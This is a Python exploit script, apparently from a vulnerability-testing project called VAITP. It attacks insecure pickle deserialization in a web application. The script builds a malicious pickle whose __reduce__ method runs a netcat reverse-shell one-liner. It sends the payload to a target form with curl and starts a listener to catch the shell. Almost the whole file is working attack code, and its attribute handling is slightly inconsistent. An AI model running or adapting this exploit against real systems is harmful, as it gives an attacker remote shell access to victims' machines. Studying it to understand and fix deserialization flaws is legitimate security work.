#based on https://davidhamann.de/2020/04/05/exploiting-python-pickle/
import pickle
import base64
import os
import subprocess
import sys
import re
from multiprocessing import Process
import time

#Defining the Remote Code Execution Class
class RCE:

    def __init__(self, lhost = "127.0.0.1", lport = 4444):
        self.lhost = lhost
        self.lport = lport

    #Whenever an object is pickled, the __reduce__ method defined by it gets called
    def __reduce__(self):
        cmd_str = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f'
        cmd = (cmd_str)
        return os.system, (cmd,)

    def set_lhost(self, lhost):
        self._lhost = lhost

    def set_lport(self, lport):
        self._lport = lport


def start_rev_nc():
    print("start_rev_nc start")
    cmd_rsh = f"nc -lnvp {lport}"
    subprocess.call(cmd_rsh,shell=True)
    print("start_rev_nc end")


def launch_exploit():
    print("launch_exploit start")
    rce = RCE()
    rce.set_lhost(f"{lhost}")
    rce.set_lport(f"{lport}")
    pickled64 = str(base64.urlsafe_b64encode(pickle.dumps(rce)))
    cmd = f"curl -d \"{form_name}={pickled64[2:-1]}\" http://{rhost}:{rport}/{url_path}"
    print(f"Complete payload string: {cmd=}")
    subprocess.call(cmd, shell=True)
    print("launch_exploit end")


if __name__ == '__main__':
    print("VAITP Exploit 01 by Frédéric Bogaerts")
    
    lhost = "localhost"
    rhost = "localhost"
    rport = 5000
    lport = 4444
    form_name = "pickled"
    url_path = "/vuln"

    #Iterate argvs
    n = len(sys.argv)
    for i in range(1, n):

        #Help        
        if sys.argv[i] == "-h" or sys.argv[i] == "--h":
            print("\n\nUsage:\n\n"
            "python exploit01_pickle.py -p [RPORT] -u [RPATH] -f [FORM_NAME] [RHOST]\n\n"
            "-p [RPORT] - Specify the remote port\n"
            "-u [RPATH] - Specify the remote url path\n"
            "-f [FORM_NAME] - Specify the remote data form name\n"
            "[RHOST] - The remote IP of the victim\n"
            "\n\nExample:\npython exploit01_pickle.py -p 5000 -u vuln -f pickled 127.0.0.1\n")
            exit(1)

        #Rport        
        if sys.argv[i] == "-p":
            if int(sys.argv[i+1]) > 0 and int(sys.argv[i+1]) < 65535:
                rport = int(sys.argv[i+1]);
                print(f"Rport set to {rport}")
            else:
                print("Invalid port number")
        
        #Form name
        elif sys.argv[i] == "-f":
            form_name = sys.argv[i+1]
            print(f"Form name set to {form_name}")
        
        #Url path
        elif sys.argv[i] == "-u":
            url_path = sys.argv[i+1]
            print(f"Url path set to {url_path}")

        #Last argument must be the target's IP 

        #TODO:
        #Could be a hostname

        ####

        ##

        elif i == n-1:
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",sys.argv[i]):
                rhost = sys.argv[i]
                print(f"Rhost set to {rhost}")
            else:
                print(f"Invalid Rhost IP")


    print(f"Attacking {form_name} form on {rhost}:{rport}{url_path}")

    if input("Continue? [y/n]: ").lower() == "y":
        print("Starting reverse shell listener")

        #Start the netcat listener on lport
        p_nc = Process(target=start_rev_nc)
        p_nc.start()
        print(f"nc started on port {lport}")

        #Allow some time for the socket to get binded
        time.sleep(3)

        #Create the payload string and launch exploit
        print("Creating payload and launching reverse shell...")
        p_exp = Process(target=launch_exploit)
        p_exp.start()

        #Join the netcat session
        p_nc.join()

print("Thank you, come again!")
        
        

        
        
    
